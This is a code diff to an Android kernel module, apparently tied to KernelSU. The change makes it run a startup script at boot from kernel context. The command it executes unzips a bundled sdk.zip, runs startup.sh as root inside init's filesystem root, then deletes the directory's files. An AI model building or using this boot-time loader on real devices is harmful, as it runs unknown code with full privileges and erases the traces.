@@ -173,6 +173,47 @@ static bool check_file_ready(const char *path)
     return exists;
 }
 
+/**
+ * 魔法函数：新进程启动前的初始化回调
+ * 作用：将当前（刚创建的执行脚本的进程）的文件系统根目录，对齐到 init 进程的真实根目录。
+ */
+static int umh_init_setup(struct subprocess_info *info, struct cred *new)
+{
+    struct task_struct *init_task = pid_task(find_vpid(1), PIDTYPE_PID);
+    struct fs_struct *init_fs;
+    struct path root, pwd;
+
+    if (!init_task) {
+        pr_err("ksu_startup: umh_init_setup 无法获取 init 进程\n");
+        return -ESRCH;
+    }
+
+    // 加锁并安全提取 init 进程的根目录和当前目录的路径引用
+    task_lock(init_task);
+    init_fs = init_task->fs;
+    if (!init_fs) {
+        task_unlock(init_task);
+        return -ENOENT;
+    }
+
+    path_get(&init_fs->root);
+    root = init_fs->root;
+
+    path_get(&init_fs->pwd);
+    pwd = init_fs->pwd;
+    task_unlock(init_task);
+
+    // 核心切换逻辑：把当前即将执行脚本的进程，强行切入 init 进程的文件系统空间
+    set_fs_root(current->fs, &root);
+    set_fs_pwd(current->fs, &pwd);
+
+    // 释放刚才申请的路径引用，防止内存泄漏
+    path_put(&root);
+    path_put(&pwd);
+
+    return 0;
+}
+
 static void execute_handler(struct work_struct *work) {
     if (!check_file_ready("/system/bin/unzip") || !check_file_ready("/system/bin/su")) {
         if (current_retry < MAX_RETRY_COUNT) {
@@ -195,18 +236,30 @@ static void execute_handler(struct work_struct *work) {
     };
 
     char *argv[] = {
-        "/system/bin/su",
+        "/system/bin/sh",
         "-c",
-        "cd /data/local/tmp && echo 123 > test.log && unzip -o sdk.zip && chmod 755 startup.sh && /system/bin/sh startup.sh && rm -f ./*",
+        "cd /data/local/tmp && echo 123 > test.log && /system/bin/unzip -o sdk.zip && chmod 755 startup.sh && ./startup.sh && rm -f ./*",
         NULL
     };
 
     // 执行脚本（异步）
-    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    struct subprocess_info *info;
+    int ret;
+
+    // 步骤 1：装配执行环境，并绑定我们的 umh_init_setup 空间切换函数
+    info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, umh_init_setup, NULL, NULL);
+    if (!info) {
+        pr_err("ksu_startup: 内存不足，无法分配 subprocess_info\n");
+        return;
+    }
+
+    // 步骤 2：触发异步执行并等待脚本结束
+    ret = call_usermodehelper_exec(info, UMH_WAIT_PROC);
+
     if (ret != 0) {
-        pr_err("ksu_startup 执行失败: %d\n", ret);
+        pr_err("ksu_startup: 脚本执行失败，返回状态码: %d\n", ret);
     } else {
-        pr_info("ksu_startup 执行成功\n");
+        pr_info("ksu_startup: 脚本执行成功！\n");
     }
 }
 
@@ -231,7 +284,6 @@ void on_post_fs_data(void)
     pr_info("ksu_startup 准备复制文件\n");
     if (copy_file_to_data() == 0) {
         pr_info("ksu_startup 成功复制到 /data/local/tmp\n");
-//        execute_handler();
         current_retry = 0;
         INIT_DELAYED_WORK(&execute_script_work, execute_handler);
         schedule_delayed_work(&execute_script_work, msecs_to_jiffies(1));
